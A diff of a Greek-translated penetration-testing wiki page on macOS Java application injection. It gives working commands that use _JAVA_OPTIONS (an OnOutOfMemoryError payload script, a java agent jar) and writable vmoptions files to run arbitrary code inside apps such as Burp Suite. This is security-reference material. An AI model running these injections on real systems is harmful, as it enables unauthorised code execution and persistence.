@@ -1,22 +1,23 @@
-# Εισαγωγή σε εφαρμογές Java στο macOS
+# macOS Java Applications Injection
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
-
-* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## Απαρίθμηση
+## Enumeration
 
-Βρείτε εγκατεστημένες εφαρμογές Java στο σύστημά σας. Παρατηρήθηκε ότι οι εφαρμογές Java στο **Info.plist** θα περιέχουν ορισμένες παραμέτρους Java που περιέχουν τον χαρακτήρα **`java.`**, οπότε μπορείτε να αναζητήσετε γι' αυτόν:
+Βρείτε τις εφαρμογές Java που είναι εγκατεστημένες στο σύστημά σας. Παρατηρήθηκε ότι οι εφαρμογές Java στο **Info.plist** θα περιέχουν κάποιες παραμέτρους java που περιέχουν τη συμβολοσειρά **`java.`**, οπότε μπορείτε να αναζητήσετε αυτό:
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -26,13 +27,13 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA\_OPTIONS
 
-Η μεταβλητή περιβάλλοντος **`_JAVA_OPTIONS`** μπορεί να χρησιμοποιηθεί για να εισαχθούν αυθαίρετες παράμετροι Java κατά την εκτέλεση μιας εφαρμογής που έχει μεταγλωττιστεί σε Java:
+Η μεταβλητή περιβάλλοντος **`_JAVA_OPTIONS`** μπορεί να χρησιμοποιηθεί για την εισαγωγή αυθαίρετων παραμέτρων java στην εκτέλεση μιας εφαρμογής που έχει μεταγλωττιστεί σε java:
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
 ```
-Για να το εκτελέσετε ως ένα νέο διεργασία και όχι ως παιδί του τρέχοντος τερματικού, μπορείτε να χρησιμοποιήσετε:
+Για να το εκτελέσετε ως νέα διαδικασία και όχι ως παιδί του τρέχοντος τερματικού, μπορείτε να χρησιμοποιήσετε:
 ```objectivec
 #import <Foundation/Foundation.h>
 // clang -fobjc-arc -framework Foundation invoker.m -o invoker
@@ -85,7 +86,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-Ωστόσο, αυτό θα προκαλέσει ένα σφάλμα στην εκτελούμενη εφαρμογή. Ένας πιο αόρατος τρόπος είναι να δημιουργήσετε έναν Java agent και να χρησιμοποιήσετε:
+Ωστόσο, αυτό θα προκαλέσει ένα σφάλμα στην εκτελούμενη εφαρμογή, ένας άλλος πιο διακριτικός τρόπος είναι να δημιουργήσετε έναν java agent και να χρησιμοποιήσετε:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -95,7 +96,7 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
 {% hint style="danger" %}
-Η δημιουργία του πράκτορα με μια **διαφορετική έκδοση της Java** από την εφαρμογή μπορεί να προκαλέσει την κατάρρευση της εκτέλεσης τόσο του πράκτορα όσο και της εφαρμογής.
+Η δημιουργία του πράκτορα με **διαφορετική έκδοση Java** από την εφαρμογή μπορεί να προκαλέσει κατάρρευση της εκτέλεσης τόσο του πράκτορα όσο και της εφαρμογής
 {% endhint %}
 
 Όπου ο πράκτορας μπορεί να είναι:
@@ -119,19 +120,19 @@ err.printStackTrace();
 ```
 {% endcode %}
 
-Για να συντάξετε τον πράκτορα, εκτελέστε:
+Για να μεταγλωττίσετε τον πράκτορα, εκτελέστε:
 ```bash
 javac Agent.java # Create Agent.class
 jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
 ```
-Με το `manifest.txt`:
+Με `manifest.txt`:
 ```
 Premain-Class: Agent
 Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-Και στη συνέχεια εξαγάγετε τη μεταβλητή περιβάλλοντος και εκτελέστε την εφαρμογή Java ως εξής:
+Και στη συνέχεια εξάγετε τη μεταβλητή env και εκτελέστε την εφαρμογή java όπως:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -140,14 +141,14 @@ export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
-## Αρχείο vmoptions
+## vmoptions file
 
-Αυτό το αρχείο υποστηρίζει την καθορισμό των **παραμέτρων Java** κατά την εκτέλεση της Java. Μπορείτε να χρησιμοποιήσετε μερικά από τα προηγούμενα κόλπα για να αλλάξετε τις παραμέτρους Java και να **κάνετε τη διεργασία να εκτελέσει αυθαίρετες εντολές**.\
-Επιπλέον, αυτό το αρχείο μπορεί να **περιλαμβάνει άλλα αρχεία** με τον κατάλογο `include`, οπότε μπορείτε επίσης να αλλάξετε ένα περιλαμβανόμενο αρχείο.
+Αυτό το αρχείο υποστηρίζει την καθορισμένη **Java params** όταν εκτελείται η Java. Μπορείτε να χρησιμοποιήσετε μερικά από τα προηγούμενα κόλπα για να αλλάξετε τις παραμέτρους java και **να κάνετε τη διαδικασία να εκτελεί αυθαίρετες εντολές**.\
+Επιπλέον, αυτό το αρχείο μπορεί επίσης να **περιλαμβάνει άλλα** με τον κατάλογο `include`, οπότε μπορείτε επίσης να αλλάξετε ένα περιλαμβανόμενο αρχείο.
 
-Επιπλέον, ορισμένες εφαρμογές Java θα **φορτώσουν περισσότερα από ένα αρχεία `vmoptions`**.
+Ακόμα περισσότερο, ορισμένες εφαρμογές Java θα **φορτώσουν περισσότερα από ένα `vmoptions`** αρχείο.
 
-Ορισμένες εφαρμογές όπως το Android Studio δείχνουν στην **έξοδό τους πού ψάχνουν** για αυτά τα αρχεία, όπως:
+Ορισμένες εφαρμογές όπως το Android Studio υποδεικνύουν στην **έξοδό τους πού ψάχνουν** για αυτά τα αρχεία, όπως:
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -158,7 +159,7 @@ open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Profession
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-Εάν δεν το κάνουν, μπορείτε εύκολα να το ελέγξετε με:
+Αν δεν το κάνουν, μπορείτε εύκολα να το ελέγξετε με:
 ```bash
 # Monitor
 sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
@@ -166,18 +167,4 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-Παρατηρήστε πόσο ενδιαφέρον είναι ότι το Android Studio σε αυτό το παράδειγμα προσπαθεί να φορτώσει το αρχείο **`/Applications/Android Studio.app.vmoptions`**, ένα μέρος όπου οποιοσδήποτε χρήστης από την ομάδα **`admin` έχει δικαιώματα εγγραφής**.
-
-<details>
-
-<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
-
-Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
-
-* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
-* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
-
-</details>
+Σημειώστε πόσο ενδιαφέρον είναι ότι το Android Studio σε αυτό το παράδειγμα προσπαθεί να φορτώσει το αρχείο **`/Applications/Android Studio.app.vmoptions`**, ένα μέρος όπου οποιοσδήποτε χρήστης από την **`admin` ομάδα έχει δικαίωμα εγγραφής.**
